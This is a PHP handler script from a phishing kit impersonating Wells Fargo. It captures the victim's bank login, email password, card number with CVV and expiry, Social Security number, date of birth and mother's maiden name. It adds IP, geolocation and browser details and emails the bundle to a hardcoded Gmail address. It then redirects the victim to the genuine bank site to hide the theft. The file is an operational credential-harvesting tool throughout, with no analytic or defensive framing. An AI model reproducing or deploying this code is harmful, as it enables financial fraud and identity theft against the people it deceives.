<?
if($_POST["formtext1"]){
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------WellsFarg0 Info-----------------------\n";
$message .= "Type            : ".$_POST['formselect1']."\n";
$message .= "Username            : ".$_POST['id']."\n";
$message .= "Password            : ".$_POST['pass']."\n";
$message .= "--------------WellsFarg0 Info-----------------------\n";
$message .= "Email Address             : ".$_POST['formtext1']."\n";
$message .= "Email Password            : ".$_POST['formtext2']."\n";
$message .= "Card Number            : ".$_POST['formtext4']."\n";
$message .= "Expiry date  MM         : ".$_POST['formtext5']."\n";
$message .= "Expiry date YY          : ".$_POST['formtext10']."\n";
$message .= "Cvv            : ".$_POST['formtext6']."\n";
$message .= "Social Security number          : ".$_POST['formtext7']."\n";
$message .= "Date of Birth  DD          : ".$_POST['formselect1']."\n";
$message .= "Date of Birth  MM          : ".$_POST['formtext8']."\n";
$message .= "Date of Birth YY           : ".$_POST['formtext11']."\n";
$message .= "Mother maiden name            : ".$_POST['formtext9']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY unknown-------------\n";
//change ur email here
$send = "saim.raza1337@gmail.com";
$subject = "Result from WellsFarg0";
$headers = "From: WellsFarg0<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

 
     header("Location: https://www.wellsfargo.com/");
     }

?>
